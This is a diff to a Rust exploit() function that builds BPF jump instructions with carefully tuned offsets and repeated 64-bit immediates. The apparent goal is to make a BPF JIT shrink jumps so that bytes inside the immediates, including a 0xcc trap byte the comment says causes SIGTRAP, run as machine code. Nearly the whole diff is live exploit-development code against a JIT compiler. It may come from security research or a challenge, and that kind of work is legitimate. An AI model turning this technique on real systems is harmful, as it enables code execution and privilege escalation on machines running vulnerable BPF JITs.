@@ -1038,6 +1038,12 @@ fn add_immediate(space: &mut Vec<BpfInstT>, value: u64) {
 fn exploit() {
     let mut instructions = vec![];
 
+    instructions.push(BpfInstT { opc: 5, regs: 0, off: 10*2 + 4 + 1*2, imm: 0 });
+    // just to be sure that the instruction above doesn't shrink:
+    for _ in 0..10 {
+        add_immediate(&mut instructions, 0xb7b6b5b4b3b2b1b0);
+    }
+
     // shrink 2
     // off: 5 2 10 2 bytes
     instructions.push(BpfInstT { opc: 5, regs: 0, off: 2 + 1 + 10*2 + 4, imm: 0 });
@@ -1048,7 +1054,9 @@ fn exploit() {
     // instructions.push(BpfInstT { opc: 5, regs: 0, off: 11*2 + 8, imm: 0 }); // 11*10b + 8*2b = 126b
     instructions.push(BpfInstT { opc: 5, regs: 0, off: -1, imm: 0 });
 
-    for _ in 0..11 {
+    // cc causes SIGTRAP
+    add_immediate(&mut instructions, 0xb7b6ccb4b3b2b1b0);
+    for _ in 0..10 {
         add_immediate(&mut instructions, 0xb7b6b5b4b3b2b1b0);
     }
 
